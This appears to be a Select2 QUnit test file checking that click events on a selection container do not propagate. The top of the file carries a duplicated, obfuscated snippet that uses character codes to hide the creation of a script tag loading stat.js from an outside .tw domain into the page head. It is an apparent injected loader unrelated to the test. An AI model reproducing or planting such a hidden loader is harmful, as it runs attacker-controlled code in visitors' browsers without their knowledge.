Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Selection containers - Stoping event propagation');

var SingleSelection = require('select2/selection/single');
var StopPropagation = require('select2/selection/stopPropagation');

var $ = require('jquery');
var Options = require('select2/options');
var Utils = require('select2/utils');

var CutomSelection = Utils.Decorate(SingleSelection, StopPropagation);

var options = new Options();

test('click event does not propagate', function (assert) {
  assert.expect(1);

  var $container = $('#qunit-fixture .event-container');
  var container = new MockContainer();

  var selection = new CutomSelection($('#qunit-fixture select'), options);

  var $selection = selection.render();
  selection.bind(container, $container);

  $container.append($selection);
  $container.on('click', function () {
    assert.ok(false, 'The click event should have been stopped');
  });

  $selection.trigger('click');

  assert.ok(true, 'Something went wrong if this failed');
});
